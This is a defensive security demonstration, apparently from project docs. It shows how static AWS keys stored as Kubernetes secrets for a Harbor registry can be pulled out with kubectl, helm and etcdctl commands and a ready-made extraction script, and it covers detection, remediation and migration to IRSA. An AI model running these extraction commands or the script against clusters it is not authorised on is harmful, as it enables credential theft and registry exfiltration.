# Credential Extraction Demonstration

## ⚠️ Educational Purpose Only

This demonstration shows how easily AWS credentials can be extracted from a Kubernetes cluster using the insecure IAM user token approach. This is provided for **educational purposes only** to illustrate the security risks.

**DO NOT use these techniques on systems you don't own or have explicit permission to test.**

## Overview

When Harbor is deployed with IAM user tokens stored in Kubernetes secrets, anyone with basic kubectl access can extract the credentials in seconds. This demonstration shows multiple methods for credential extraction and explains the security implications.

## Prerequisites

- kubectl access to the cluster
- Basic permissions to read secrets in the `harbor` namespace
- Understanding of base64 encoding

## Method 1: Direct Secret Extraction (Easiest)

### Step 1: List Secrets

```bash
# List all secrets in the harbor namespace
kubectl get secrets -n harbor

# Output:
# NAME                      TYPE     DATA   AGE
# harbor-s3-credentials     Opaque   2      1h
# harbor-admin-password     Opaque   1      1h
# default-token-xxxxx       kubernetes.io/service-account-token   3      1h
```

### Step 2: Extract and Decode Credentials

```bash
# Extract the access key
kubectl get secret harbor-s3-credentials -n harbor \
  -o jsonpath='{.data.accesskey}' | base64 -d

# Output: AKIAIOSFODNN7EXAMPLE

# Extract the secret key
kubectl get secret harbor-s3-credentials -n harbor \
  -o jsonpath='{.data.secretkey}' | base64 -d

# Output: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
```

**Time to extract**: ~10 seconds  
**Skill level required**: Beginner  
**Detection difficulty**: Very difficult (normal kubectl operation)

### Step 3: Use Stolen Credentials

```bash
# Configure AWS CLI with stolen credentials
export AWS_ACCESS_KEY_ID="AKIAIOSFODNN7EXAMPLE"
export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
export AWS_DEFAULT_REGION="us-east-1"

# Verify access works
aws sts get-caller-identity

# Output:
# {
#     "UserId": "AIDAXXXXXXXXXXXXXXXXX",
#     "Account": "123456789012",
#     "Arn": "arn:aws:iam::123456789012:user/harbor-s3-user"
# }

# List S3 buckets
aws s3 ls

# Access Harbor's S3 bucket
aws s3 ls s3://harbor-registry-storage/harbor/ --recursive
```

## Method 2: View Secret in YAML Format

```bash
# Get the complete secret in YAML
kubectl get secret harbor-s3-credentials -n harbor -o yaml
```

Output:
```yaml
apiVersion: v1
data:
  accesskey: <base64-encoded-access-key-id>
  secretkey: <base64-encoded-secret-access-key>
kind: Secret
metadata:
  creationTimestamp: "2024-01-15T10:00:00Z"
  name: harbor-s3-credentials
  namespace: harbor
  resourceVersion: "12345"
  uid: abcd1234-5678-90ef-ghij-klmnopqrstuv
type: Opaque
```

Decode manually:
```bash
echo "<base64-encoded-access-key-id>" | base64 -d
# Output: AKIAIOSFODNN7EXAMPLE

echo "<base64-encoded-secret-access-key>" | base64 -d
# Output: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
```

## Method 3: Extract from Pod Environment Variables

```bash
# Find Harbor registry pod
REGISTRY_POD=$(kubectl get pod -n harbor -l component=registry -o jsonpath='{.items[0].metadata.name}')

# View environment variables
kubectl exec -n harbor ${REGISTRY_POD} -- env | grep AWS

# Output:
# AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
# AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
# AWS_REGION=us-east-1
```

**Time to extract**: ~15 seconds  
**Skill level required**: Beginner  
**Detection difficulty**: Very difficult (normal debugging operation)

## Method 4: Extract from Pod Specification

```bash
# Get pod specification
kubectl get pod -n harbor -l component=registry -o yaml | grep -A 10 "env:"

# Output shows environment variables with secret references:
# env:
# - name: AWS_ACCESS_KEY_ID
#   valueFrom:
#     secretKeyRef:
#       name: harbor-s3-credentials
#       key: accesskey
# - name: AWS_SECRET_ACCESS_KEY
#   valueFrom:
#     secretKeyRef:
#       name: harbor-s3-credentials
#       key: secretkey
```

Then extract the secret as shown in Method 1.

## Method 5: Automated Extraction Script

Create `extract-credentials.sh`:

```bash
#!/bin/bash

# Credential Extraction Script
# Educational purposes only

set -e

NAMESPACE="${1:-harbor}"
SECRET_NAME="${2:-harbor-s3-credentials}"

echo "================================================"
echo "Credential Extraction Demonstration"
echo "================================================"
echo ""
echo "Target Namespace: ${NAMESPACE}"
echo "Target Secret: ${SECRET_NAME}"
echo ""

# Check if secret exists
if ! kubectl get secret ${SECRET_NAME} -n ${NAMESPACE} &>/dev/null; then
    echo "❌ Error: Secret '${SECRET_NAME}' not found in namespace '${NAMESPACE}'"
    exit 1
fi

echo "✅ Secret found"
echo ""

# Extract credentials
echo "Extracting credentials..."
echo ""

ACCESS_KEY=$(kubectl get secret ${SECRET_NAME} -n ${NAMESPACE} -o jsonpath='{.data.accesskey}' | base64 -d)
SECRET_KEY=$(kubectl get secret ${SECRET_NAME} -n ${NAMESPACE} -o jsonpath='{.data.secretkey}' | base64 -d)

echo "================================================"
echo "EXTRACTED CREDENTIALS"
echo "================================================"
echo ""
echo "AWS_ACCESS_KEY_ID:     ${ACCESS_KEY}"
echo "AWS_SECRET_ACCESS_KEY: ${SECRET_KEY}"
echo ""

# Test credentials
echo "Testing credentials..."
echo ""

export AWS_ACCESS_KEY_ID="${ACCESS_KEY}"
export AWS_SECRET_ACCESS_KEY="${SECRET_KEY}"
export AWS_DEFAULT_REGION="us-east-1"

if aws sts get-caller-identity &>/dev/null; then
    echo "✅ Credentials are VALID and ACTIVE"
    echo ""
    
    # Get identity information
    IDENTITY=$(aws sts get-caller-identity)
    echo "Identity Information:"
    echo "${IDENTITY}" | jq .
    echo ""
    
    # List accessible S3 buckets
    echo "Accessible S3 Buckets:"
    aws s3 ls
    echo ""
    
    # Check Harbor bucket access
    HARBOR_BUCKET="harbor-registry-storage"
    if aws s3 ls s3://${HARBOR_BUCKET}/ &>/dev/null; then
        echo "✅ Can access Harbor S3 bucket: ${HARBOR_BUCKET}"
        echo ""
        echo "Sample contents:"
        aws s3 ls s3://${HARBOR_BUCKET}/harbor/ --recursive | head -10
    fi
else
    echo "❌ Credentials are invalid or inactive"
fi

echo ""
echo "================================================"
echo "SECURITY IMPLICATIONS"
echo "================================================"
echo ""
echo "⚠️  These credentials can be used to:"
echo "   - Download all container images"
echo "   - Upload malicious images"
echo "   - Delete registry data"
echo "   - Modify S3 bucket policies"
echo "   - Incur AWS costs"
echo ""
echo "⚠️  These credentials:"
echo "   - Never expire"
echo "   - Work from anywhere (not bound to cluster)"
echo "   - Cannot be traced to specific pods"
echo "   - Are stored in multiple locations"
echo ""
echo "✅  IRSA eliminates this vulnerability by:"
echo "   - Using temporary tokens (expire in 24h)"
echo "   - Binding credentials to specific pods"
echo "   - Providing full audit trail"
echo "   - Automatic rotation"
echo ""
```

Make it executable and run:

```bash
chmod +x extract-credentials.sh
./extract-credentials.sh harbor harbor-s3-credentials
```

## Method 6: Extract from Helm Release

```bash
# Get Helm release values (may contain credentials)
helm get values harbor -n harbor

# Output may show:
# imageChartStorage:
#   s3:
#     accesskey: AKIAIOSFODNN7EXAMPLE
#     secretkey: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
```

## Method 7: Extract from etcd Backup

If you have access to etcd backups:

```bash
# Extract secret from etcd backup
ETCDCTL_API=3 etcdctl get /registry/secrets/harbor/harbor-s3-credentials \
  --print-value-only | jq -r '.data.accesskey' | base64 -d
```

## Attack Scenarios

### Scenario 1: Malicious Insider

**Attacker**: Developer with kubectl access  
**Motivation**: Steal proprietary container images  
**Method**: Use Method 1 (10 seconds)  
**Impact**: Complete registry exfiltration  
**Detection**: Nearly impossible (normal kubectl operation)

### Scenario 2: Compromised CI/CD Pipeline

**Attacker**: External attacker who compromised CI/CD  
**Motivation**: Supply chain attack  
**Method**: CI/CD has kubectl access, uses Method 1  
**Impact**: Inject malicious images into production  
**Detection**: Difficult without image signing

### Scenario 3: Lateral Movement

**Attacker**: Attacker who compromised a pod  
**Motivation**: Escalate privileges  
**Method**: From pod, use kubectl or API to extract secret  
**Impact**: Gain AWS access, pivot to other services  
**Detection**: Requires pod security policies and network policies

### Scenario 4: Accidental Exposure

**Attacker**: None (accidental)  
**Motivation**: N/A  
**Method**: Credentials committed to Git, posted in Slack, etc.  
**Impact**: Public exposure of credentials  
**Detection**: Automated secret scanners (after the fact)

## Detection Challenges

### Why This is Hard to Detect

1. **Normal Operations**: Reading secrets is a legitimate kubectl operation
2. **No Audit Trail**: Kubernetes audit logs may not be enabled
3. **Credential Usage**: AWS CloudTrail shows `harbor-s3-user`, not the attacker
4. **Time Window**: Extraction takes seconds, detection takes minutes/hours
5. **Offline Usage**: Credentials work from anywhere, not just the cluster

### Detection Strategies (Limited Effectiveness)

```bash
# Enable Kubernetes audit logging
# Look for secret read operations
kubectl logs -n kube-system kube-apiserver-xxx | grep "secrets/harbor-s3-credentials"

# Monitor CloudTrail for unusual access patterns
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=Username,AttributeValue=harbor-s3-user \
  --max-results 50

# Check for access from unexpected IPs
# (Difficult: credentials work from anywhere)
```

## Security Implications

### Immediate Risks

1. **Credential Theft**: Anyone with kubectl access can steal credentials in seconds
2. **Unlimited Validity**: Credentials never expire, providing unlimited time window
3. **Unrestricted Usage**: Credentials work from anywhere, not bound to cluster
4. **Poor Attribution**: All actions appear as `harbor-s3-user` in CloudTrail
5. **Privilege Escalation**: Overprivileged policies allow lateral movement

### Long-term Risks

1. **Credential Sprawl**: Credentials copied to multiple locations
2. **Rotation Burden**: Manual rotation is error-prone and often neglected
3. **Compliance Violations**: Fails SOC2, ISO 27001, PCI-DSS requirements
4. **Incident Response**: Cannot trace actions to specific users or pods
5. **Supply Chain Risk**: Compromised credentials enable supply chain attacks

## Comparison: IRSA Security

With IRSA, these extraction methods **do not work**:

```bash
# Try to extract credentials from IRSA deployment
kubectl get secret -n harbor

# Output: No AWS credential secrets exist!
# NAME                      TYPE     DATA   AGE
# harbor-admin-password     Opaque   1      1h
# default-token-xxxxx       kubernetes.io/service-account-token   3      1h

# Try to view environment variables
kubectl exec -n harbor ${REGISTRY_POD} -- env | grep AWS

# Output: No AWS credentials in environment!
# AWS_REGION=us-east-1
# AWS_ROLE_ARN=arn:aws:iam::123456789012:role/HarborS3Role
# AWS_WEB_IDENTITY_TOKEN_FILE=/var/run/secrets/eks.amazonaws.com/serviceaccount/token

# The token file is:
# - Temporary (expires in 24 hours)
# - Bound to this specific pod
# - Automatically rotated
# - Only works from this pod's identity
# - Fully auditable in CloudTrail
```

### IRSA Token Characteristics

```bash
# View the IRSA token (safe to show, it's bound to pod)
kubectl exec -n harbor ${REGISTRY_POD} -- cat /var/run/secrets/eks.amazonaws.com/serviceaccount/token

# Output: JWT token like:
# eyJhbGciOiJSUzI1NiIsImtpZCI6IjEyMzQ1Njc4OTAifQ.eyJhdWQiOlsic3RzLmFtYXpvbmF3cy5jb20iXSwi
# ZXhwIjoxNzA1MzI3MjAwLCJpYXQiOjE3MDUyNDA4MDAsImlzcyI6Imh0dHBzOi8vb2lkYy5la3MudXMtZWFzdC0x
# LmFtYXpvbmF3cy5jb20vaWQvQUJDREVGR0hJSktMTU5PUFFSUyIsImt1YmVybmV0ZXMuaW8iOnsibmFtZXNwYWNl
# IjoiaGFyYm9yIiwicG9kIjp7Im5hbWUiOiJoYXJib3ItcmVnaXN0cnktNzg5YWJjZGVmLXh5ejEyIiwidWlkIjoi
# YWJjZDEyMzQtNTY3OC05MGFiLWNkZWYtZ2hpamtsbW5vcHFyIn0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJo
# YXJib3ItcmVnaXN0cnkiLCJ1aWQiOiJ4eXoxMjM0LTU2NzgtOTBhYi1jZGVmLWdoaWprbG1ub3BxciJ9fSwibmJm
# IjoxNzA1MjQwODAwLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6aGFyYm9yOmhhcmJvci1yZWdpc3RyeSJ9
# .signature...

# Decode the token to see claims
echo "eyJhbGciOiJSUzI1NiIsImtpZCI6IjEyMzQ1Njc4OTAifQ.eyJhdWQiOlsic3RzLmFtYXpvbmF3cy5jb20iXSwi..." | \
  cut -d. -f2 | base64 -d | jq .

# Output shows token is bound to specific pod:
# {
#   "aud": ["sts.amazonaws.com"],
#   "exp": 1705327200,
#   "iat": 1705240800,
#   "iss": "https://oidc.eks.us-east-1.amazonaws.com/id/ABCDEFGHIJKLMNOPQRS",
#   "kubernetes.io": {
#     "namespace": "harbor",
#     "pod": {
#       "name": "harbor-registry-789abcdef-xyz12",
#       "uid": "abcd1234-5678-90ab-cdef-ghijklmnopqr"
#     },
#     "serviceaccount": {
#       "name": "harbor-registry",
#       "uid": "xyz1234-5678-90ab-cdef-ghijklmnopqr"
#     }
#   },
#   "nbf": 1705240800,
#   "sub": "system:serviceaccount:harbor:harbor-registry"
# }
```

**Key Differences**:
- Token expires in 24 hours (not permanent)
- Bound to specific pod (cannot use from laptop)
- Automatically rotated (no manual intervention)
- Full audit trail (CloudTrail shows pod identity)

## Remediation

### Immediate Actions

If you discover this vulnerability in your environment:

1. **Rotate Credentials Immediately**
   ```bash
   # Deactivate old access key
   aws iam update-access-key --user-name harbor-s3-user \
     --access-key-id AKIAIOSFODNN7EXAMPLE --status Inactive
   
   # Create new access key
   aws iam create-access-key --user-name harbor-s3-user
   
   # Update Kubernetes secret
   kubectl create secret generic harbor-s3-credentials \
     --from-literal=accesskey="NEW_ACCESS_KEY" \
     --from-literal=secretkey="NEW_SECRET_KEY" \
     --namespace=harbor --dry-run=client -o yaml | kubectl apply -f -
   
   # Restart Harbor pods
   kubectl rollout restart deployment -n harbor
   ```

2. **Audit CloudTrail Logs**
   ```bash
   # Look for suspicious activity
   aws cloudtrail lookup-events \
     --lookup-attributes AttributeKey=Username,AttributeValue=harbor-s3-user \
     --start-time $(date -u -d '7 days ago' +%Y-%m-%dT%H:%M:%S) \
     --max-results 1000 > audit.json
   
   # Check for unusual IPs, times, or actions
   cat audit.json | jq '.Events[] | {time: .EventTime, ip: .SourceIPAddress, action: .EventName}'
   ```

3. **Enable Kubernetes Audit Logging**
   ```yaml
   # Enable audit logging for secret access
   apiVersion: audit.k8s.io/v1
   kind: Policy
   rules:
   - level: RequestResponse
     resources:
     - group: ""
       resources: ["secrets"]
     namespaces: ["harbor"]
   ```

### Long-term Solution: Migrate to IRSA

The only secure solution is to migrate to IRSA:

1. Set up OIDC provider on EKS
2. Create IAM role with least-privilege policy
3. Configure trust policy for specific service account
4. Deploy Harbor with IRSA annotations
5. Remove IAM user and static credentials
6. Enable S3 encryption with KMS

See: [Secure IRSA Deployment Guide](./secure-deployment-guide.md)

## Conclusion

This demonstration shows that extracting AWS credentials from Kubernetes secrets is:

- **Trivial**: Takes 10 seconds with basic kubectl knowledge
- **Undetectable**: Appears as normal kubectl operation
- **Devastating**: Provides full, permanent AWS access
- **Untraceable**: CloudTrail cannot identify the attacker

**The only solution is to eliminate static credentials entirely by using IRSA.**

## References

- [Kubernetes Secrets Are Not Secret](https://kubernetes.io/docs/concepts/configuration/secret/#security-properties)
- [AWS IAM Best Practices](https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html)
- [IRSA Documentation](https://docs.aws.amazon.com/eks/latest/userguide/iam-roles-for-service-accounts.html)
- [CIS Kubernetes Benchmark](https://www.cisecurity.org/benchmark/kubernetes)
